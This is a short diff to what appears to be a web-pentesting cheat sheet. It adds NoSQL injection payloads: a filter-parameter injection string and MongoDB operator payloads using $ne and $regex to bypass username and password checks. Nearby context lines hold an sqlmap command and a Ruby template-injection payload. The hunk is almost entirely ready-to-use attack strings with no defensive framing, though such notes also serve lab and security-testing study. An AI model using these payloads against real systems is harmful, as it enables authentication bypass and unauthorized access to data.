@@ -332,6 +332,10 @@ sqlmap -R request.txt --batch --random-refer
 
 # nosql injection (SQL):
 username=admin&password[$ne]=admin
+filter?category=Gifts' || 'Pets
+
+{"username":{"$ne":""},"password":"peter"}
+{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
 
 # RUBY template injection (ruby, ssti)
 ?message=<%= EXPRESSION %>
